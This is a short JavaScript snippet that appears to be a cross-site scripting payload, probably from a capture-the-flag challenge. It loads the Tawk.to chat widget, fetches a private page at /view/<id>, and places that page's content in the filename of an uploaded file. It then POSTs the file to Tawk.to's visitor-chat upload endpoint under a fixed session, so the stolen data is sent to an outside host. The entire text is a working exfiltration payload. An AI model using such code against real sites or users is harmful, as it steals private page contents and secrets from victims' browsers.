var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/61830caa6bb0760a494106d7/1fjjuiusl';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);

})();

fetch("/view/f1135719-d3a5-4534-9bc1-f7ddcf4c8cb3").then((res) => {
    return res.text();
  }).then(data => {
			var formData = new FormData();
			var file = new File(["flag"], data, {
			type: "text/plain",
		});

    formData.append("body", file);

    fetch("https://upload.tawk.to/upload/visitor-chat/visitor?handle=20e5e5bffcd2f3dc772b7d42271a569d03c0c77e&visitorSessionId=61857053ce40c32e3efc7035",{
        method: 'POST',
        body: formData
    });

})
